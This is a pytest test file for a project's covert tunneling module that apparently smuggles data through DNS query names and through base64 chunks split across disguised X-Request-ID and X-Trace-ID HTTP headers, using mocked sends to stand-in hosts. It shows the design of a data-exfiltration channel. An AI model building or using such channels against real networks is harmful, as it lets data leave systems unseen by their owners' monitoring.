import pytest
from unittest.mock import patch, MagicMock
from core.tunnel.dns import DNSTunnel
from core.tunnel.http import HTTPTunnel
import base64

def test_dns_tunnel_send():
    with patch('core.tunnel.dns.send') as mock_send:
        DNSTunnel.send(b"hello", "1.2.3.4", "session123")
        
        # Check if scapy.send was called
        assert mock_send.called
        # Check payload in the first call
        pkt = mock_send.call_args[0][0]
        qname = pkt['DNS'].qd.qname.decode('utf-8')
        assert "session123" in qname

def test_http_tunnel_send():
    with patch('httpx.Client.post') as mock_post:
        mock_post.return_value = MagicMock(status_code=200)
        HTTPTunnel.send(b"secret", "http://test.com")
        
        assert mock_post.called
        headers = mock_post.call_args[1]['headers']
        assert "X-Request-ID" in headers
        assert "X-Trace-ID" in headers

def test_http_tunnel_receive():
    payload = b"hello world"
    encoded = base64.b64encode(payload).decode('utf-8')
    mid = len(encoded) // 2
    headers = {
        "X-Request-ID": encoded[:mid],
        "X-Trace-ID": encoded[mid:]
    }
    
    decoded = HTTPTunnel.receive_from_headers(headers)
    assert decoded == payload

def test_dns_tunnel_roundtrip_logic():
    # Test encoding/decoding logic without actual networking
    payload = b"Top secret DNS data"
    encoded = base64.b32encode(payload).decode('utf-8').rstrip('=')
    
    # Simulate receiving chunks
    padding = (8 - (len(encoded) % 8)) % 8
    decoded = base64.b32decode(encoded + "=" * padding)
    assert decoded == payload
